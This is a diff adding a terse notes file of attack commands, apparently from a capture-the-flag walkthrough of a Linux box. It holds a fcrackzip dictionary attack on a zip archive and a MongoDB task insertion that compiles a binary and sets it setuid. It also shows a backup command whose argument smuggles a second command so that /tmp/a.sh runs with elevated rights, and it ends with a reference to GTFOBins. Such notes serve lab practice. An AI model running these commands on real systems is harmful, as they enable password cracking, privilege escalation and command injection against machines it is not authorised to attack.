@@ -1,0 +1,12 @@
+
+fcrackzip -D -u -p rockyou.txt back.zip
+
+
+imongo mongodb://user:passwd@localhost:27017/scheduler
+
+db.tasks.insert({"cmd":"gcc  /tmp/alluid.c -o /tmp/alluid;chown tom:admin /tmp/alluid; chmod +s /tmp/alluid;"})
+
+ backup  -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "/var/www/myplace -T -TT '/tmp/a.sh #'"
+
+
+GTFOBins
